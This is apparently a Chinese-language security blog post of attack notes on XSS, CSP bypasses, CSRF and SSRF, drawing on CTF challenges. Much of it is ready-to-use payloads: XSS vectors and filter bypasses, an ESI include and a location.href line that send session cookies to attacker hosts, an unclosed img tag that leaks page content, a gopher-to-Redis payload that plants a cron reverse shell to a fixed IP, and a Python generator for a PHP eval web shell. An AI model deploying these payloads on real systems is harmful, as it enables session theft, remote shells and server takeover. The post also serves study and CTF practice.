<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p> 恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。 </p>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型，存储型，dom型</p>
<p>可能触发DOM型XSS的属性：</p>
<p>document.referer属性</p>
<p>window.name属性</p>
<p>location属性</p>
<p>innerHTML属性</p>
<p>documen.write属性</p>
<h3 id="常见exp"><a href="#常见exp" class="headerlink" title="常见exp"></a>常见exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href"javascript:alert(1)"&gt;click&lt;/</span>a&gt;</span><br><span class="line">&lt;iframe src=<span class="string">"javascript:alert(1)"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;iframe srcdoc=<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>&lt;<span class="regexp">/iframe&gt;</span></span><br><span class="line"><span class="regexp">&lt;embed src="data:text/</span>html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<span class="string">"&gt;&lt;/embed&gt;</span></span><br><span class="line"><span class="string">&lt;svg/onload=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过安全策略"><a href="#绕过安全策略" class="headerlink" title="绕过安全策略"></a>绕过安全策略</h3><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>html实体编码</p>
<p> DOM元素的属性值会自动HTML解码 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>自动html编码的标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nosctipt</span>&gt;</span><span class="tag">&lt;/<span class="name">nosctipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>js编码</p>
<p> eval中的参数可以JS编码 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;alert\501\51&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>GBK字符造成逃逸</p>
<blockquote>
<p>%bf和\  一起会形成一个新的字符。这样就吞掉了一个\</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://54.223.108.205:23333/new.php</span><br><span class="line"></span><br><span class="line">title=123&amp;content=123%bf\x3csvg/onload=alert(1);   %bf\x3e&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>一些trick</p>
<ul>
<li><p>url中协议头可去掉，如//example.com(http)，\example(https，linux)</p>
</li>
<li><p>过滤<code>;</code>，用换行</p>
</li>
<li><p>HTML实体编码中，<code>;</code>可以去掉，例如&amp;#60，不需要<code>;</code></p>
</li>
<li><p>可以利用拼接一个eval函数执行代码，例如<code>&quot;a&quot;+eval(&quot;alert(1)&quot;)</code></p>
</li>
<li><p>ip可以用10进制或者16进制表示</p>
</li>
</ul>
<h4 id="bypass-http-only"><a href="#bypass-http-only" class="headerlink" title="bypass http-only"></a>bypass http-only</h4><p> 开启httponly之后，JS无法访问cookie。 </p>
<p>CVE-2012-005 通过植入超大的cookie，使得HTTP头超过apache的LimitRequestsFieldSize（4192），apache便会返回400错误，状态页中就包含了http-only保护的cookie</p>
<p>利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。</p>
<p>ESI(Edge Side Include)注入技术</p>
<p> ESI语言是基于XML标签的的标记语言，通过缓存大量的web内容缓解服务器性能压力，主要被用于流行的HTTP 代理解决方案中。ESI标签用于指示反向代理（缓存服务器）获取已经缓存好的模板的网页的更多信息。在客户端处理的这些信息很可能来自另一台服务器。 </p>
<p> HTTP代理无法区分ESI标签是来自上游服务器的合法标签还是HTTP响应包中恶意注入的。也就是说，如果攻击者可以成功地注入在HTTP响应包中注入ESI标签，那么代理就是解析处理它们，认为这些ESI标签是来自上游服务器的合法标签。 </p>
<p>SSRF payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;esi:include src=&quot;http://vps:12345&quot; /</span><br></pre></td></tr></table></figure>

<p>  客户端XSS过滤器通常通过将请求的输入与其响应进行比较来工作。当部分GET参数在HTTP响应中出现时，浏览器将启动一系列安全措施以确定是否存在潜在的XSS payload </p>
<p>但是，Chrome的XSS保护不知道ESI标签，因为ESI标签不在客户端进行处理。通过执行一些ESI特性，可以将一部分XSS payload分配给ESI引擎中的变量，然后将其执行返回。在ESI引擎完全发送响应数据给浏览器之前，ESI引擎将在服务器端构建出恶意JavaScript payload 。这将绕过XSS过滤器，因为发送到服务器的输入不会按原样返回给浏览器，绕过了我们上面提到的检测机制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=&lt;esi:assign name=&quot;var1&quot; value=&quot;&apos;cript&apos;&quot;/&gt;&lt;s&lt;esi:vars name=&quot;$(var1)&quot;/&gt;</span><br><span class="line">&gt;alert(/Chrome%20XSS%20filter%20bypass/);&lt;/s&lt;esi:vars name=&quot;$(var1)&quot;/&gt;&gt;</span><br></pre></td></tr></table></figure>

<p> 由于ESI是在服务器端进行处理的，因此可以在从上游服务器到代理的过程中使用这些cookie。一个攻击媒介将使用ESI include通过其URL来外带cookie </p>
<p>获取http-only的cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;esi:include src=&quot;http://evil.com/?cookie=$(HTTP_COOKIE&#123;&apos;JSESSIONID&apos;&#125;)&quot; /&gt;</span><br></pre></td></tr></table></figure>

<h4 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h4><p>CSP： 内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。<br>当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行 </p>
<h5 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h5><p> CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用<br>当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"vps_ip:xxxx?"</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure>

<p>利用条件：可以执行任意js代码，但是由于CSP不能外带数据</p>
<h5 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h5><p> 当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效</p>
<p>A页面 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self'"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>B页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">"A页面"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'flag'</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用条件：一个同源站点内存在两个页面，一个有CSP防护，而另一个没有CSP保护且存在XSS，我们想要的数据在有CSP保护的页面内</p>
<h5 id="用CDN来绕过"><a href="#用CDN来绕过" class="headerlink" title="用CDN来绕过"></a>用CDN来绕过</h5><p> 一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险 </p>
<p>orange师傅的文章： <a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a> </p>
<p>举例： 如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以用此exp </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用条件：CDN服务商存在某些低版本的js库且此CDN服务商在CSP白名单中</p>
<h5 id="站点可控静态资源绕过"><a href="#站点可控静态资源绕过" class="headerlink" title="站点可控静态资源绕过"></a>站点可控静态资源绕过</h5><p> codimd的CSP中使用了<code>www.google-analytics.com</code><br>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a> </p>
<p>利用条件：站点存在可控静态资源，站点在CSP白名单中</p>
<h5 id="站点可控JSONP绕过"><a href="#站点可控JSONP绕过" class="headerlink" title="站点可控JSONP绕过"></a>站点可控JSONP绕过</h5><p> 大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析 </p>
<p>例题： ins’hack 2019 bypasses-everywhere </p>
<p>利用条件：站点存在可控JSONP，且在CSP白名单中</p>
<h5 id="base-uri绕过"><a href="#base-uri绕过" class="headerlink" title="base-uri绕过"></a>base-uri绕过</h5><p> RCTF 2018 rBlog的非预期解 </p>
<p> 当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用``标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> 如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内 </p>
<p>利用条件：script-src只使用nonce，没有设置额外的base-uri，页面引用存在相对路径的<code>&lt;scirpt&gt;</code>标签</p>
<h5 id="不完整script标签绕过nonce"><a href="#不完整script标签绕过nonce" class="headerlink" title="不完整script标签绕过nonce"></a>不完整script标签绕过nonce</h5><p>漏洞代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-xxxxx&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;xss&apos;]?&gt;</span><br><span class="line">&lt;script nonce=&apos;xxxxx&apos;&gt;</span><br><span class="line">  //do some thing</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</span><br></pre></td></tr></table></figure>

<p> 这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的&lt;script会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src </p>
<p>利用条件：可控点在合法的script标签上方，且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式</p>
<h5 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF-XSS"></a>PDF-XSS</h5><p> PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本  当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等 </p>
<p>参考链接： <a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a> </p>
<p>利用条件：没有设置object-src，或者object-src没有设置为‘none’，pdf用的是chrome默认的解析器</p>
<h5 id="svg-绕过"><a href="#svg-绕过" class="headerlink" title="svg 绕过"></a>svg 绕过</h5><p> SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss </p>
<p>例题： CONFidence CTF </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用条件：可以上传svg图片</p>
<h5 id="不完整的资源标签获取资源"><a href="#不完整的资源标签获取资源" class="headerlink" title="不完整的资源标签获取资源"></a>不完整的资源标签获取资源</h5><p>漏洞代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self';script-src 'self'; img-src *;"</span>&gt;</span><br><span class="line">&lt;?php echo $_GET[<span class="string">'xss'</span>]?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;<span class="number">0xffff</span>&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;h2 id="id"&gt;3&lt;/</span>h2&gt;</span><br></pre></td></tr></table></figure>

<p> 这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的&lt;img标签来将数据带出 </p>
<p>exp：<code>?xss=&lt;img src=&quot;//VPS_IP?a=</code></p>
<p> 此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上 </p>
<p> 需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或&lt;，否者不会发出 </p>
<p>利用条件：可以加载外域资源，需要获取页面某处的信息</p>
<h5 id="CSS选择器获取内容"><a href="#CSS选择器获取内容" class="headerlink" title="CSS选择器获取内容"></a>CSS选择器获取内容</h5><p>例题： 2018 SECCON CTF</p>
<p>需要设置style-src为*，或者只设置了script-src </p>
<p> 大概思路就是css提供了选择器，当选择器到对应元素的时，可以加载一个外域请求，相当于sql的盲注 </p>
<p>利用条件比较苛刻</p>
<h5 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h5><p> HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP </p>
<p>参考链接： <a href="https://evoa.me/index.php/archives/53/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/53/</a> </p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>对输入(和URL参数)进行过滤，对输出进行编码。 </p>
<p>设置安全策略</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<p>攻击流程：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</p>
<p>局限性（前提条件）：</p>
<p>a.目标站点不能有检查referer头的操作，或许被攻击者的浏览器允许referer欺骗。</p>
<p>b.攻击者必须在目标站点找到啊一个表单的提交入口，或者有类似的URL（例如用来转钱，修改受害者邮箱或者密码）</p>
<p>c.攻击者必须觉得所有的表单或者URL参数中的正确的值；如果有秘密验证值或者ID，攻击者没有猜对，攻击很可能不成功。</p>
<p>d.攻击者必须诱使受害者访问有恶意代码的页面，并且此时受害者已经登录到目标站点。</p>
<p>CSS注入-爆破CSRF Token</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p> SSRF（全称 Server Side Request Forgery）服务端请求伪造。ssrf的形成是因为程序接口或者某种功能没有严格的进行过滤和内网隔离导致，攻击者可以构造恶意请求由服务端接受请求后发起这个请求。 </p>
<p>SSRF可能出现的场景：</p>
<ul>
<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li>
<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
</ul>
<p>漏洞造成的危害：</p>
<p>(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
<p>(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入、DDOS等）;</p>
<p>(5)、利用File协议读取本地文件。</p>
<p> SSRF在PHP中由 <code>curl()、file_get_contents()、fsockopen()</code>函数产生 </p>
<p> <strong>在没有回显的情况下可以根据DNSlog的请求判断</strong> </p>
<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="利用-Gopher-打redis"><a href="#利用-Gopher-打redis" class="headerlink" title="利用 Gopher 打redis"></a>利用 Gopher 打redis</h4><ul>
<li>绝对路径写shell</li>
<li>写ssh公钥</li>
<li>反弹shell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>

<p>转换脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"192.168.163.128"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>

